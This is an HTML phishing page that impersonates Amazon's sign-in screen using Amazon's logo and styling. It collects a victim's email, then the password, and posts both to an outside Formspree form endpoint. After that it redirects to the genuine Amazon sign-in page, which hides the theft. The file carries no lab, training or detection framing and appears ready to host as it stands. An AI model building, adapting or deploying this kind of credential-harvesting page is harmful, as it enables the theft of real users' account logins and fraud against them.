<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Amazon Sign-In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      display: flex;
      justify-content: center;
      padding-top: 40px;
      margin: 0;
    }

    .box {
      width: 350px;
      border: 1px solid #ddd;
      padding: 26px 26px 30px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 90px;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 18px;
      font-weight: normal;
    }

    label {
      font-size: 13px;
      font-weight: bold;
      margin-bottom: 4px;
      display: block;
    }

    input {
      width: 100%;
      padding: 8px;
      margin-bottom: 14px;
      border: 1px solid #a6a6a6;
      border-radius: 3px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #f0c14b;
      border: 1px solid #a88734;
      border-radius: 3px;
      font-size: 13px;
      cursor: pointer;
    }

    .help {
      font-size: 12px;
      margin-top: 10px;
    }

    .help a {
      color: #0066c0;
      text-decoration: none;
    }

    .help a:hover {
      text-decoration: underline;
    }

    .create-account {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
    }

    .create-account a {
      color: #0066c0;
    }

    #step-password {
      display: none;
    }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    </div>

    <!-- Step 1: Email -->
    <div id="step-email">
      <h1>Sign in</h1>
      <form id="emailForm">
        <label for="email">Email or mobile phone number</label>
        <input type="text" id="emailInput" required>
        <button type="submit">Continue</button>
      </form>
    </div>

    <!-- Step 2: Password -->
    <div id="step-password">
      <h1>Sign in</h1>
      <form id="passwordForm" action="https://formspree.io/f/xjkwgjyb" method="POST">
        <!-- Redirect directly to Amazon after submission -->
        <input type="hidden" name="_redirect" value="https://www.amazon.com/ap/signin">
        <input type="hidden" name="email" id="hiddenEmailField">
        <label for="password">Password</label>
        <input type="password" name="message" id="passwordInput" required>
        <button type="submit">Sign-In</button>
        <div class="help">
          <a href="#">Forgot your password?</a>
        </div>
      </form>
    </div>

    <div class="create-account">
      <p>New to Amazon? <a href="#">Create your Amazon account</a></p>
    </div>
  </div>

  <script>
    const emailForm = document.getElementById("emailForm");
    const emailInput = document.getElementById("emailInput");
    const stepEmail = document.getElementById("step-email");
    const stepPassword = document.getElementById("step-password");
    const hiddenEmailField = document.getElementById("hiddenEmailField");

    emailForm.addEventListener("submit", function(e) {
      e.preventDefault();
      const email = emailInput.value.trim();
      if (email) {
        hiddenEmailField.value = email;
        stepEmail.style.display = "none";
        stepPassword.style.display = "block";
        document.getElementById("passwordInput").focus();
      }
    });
  </script>
</body>
</html>
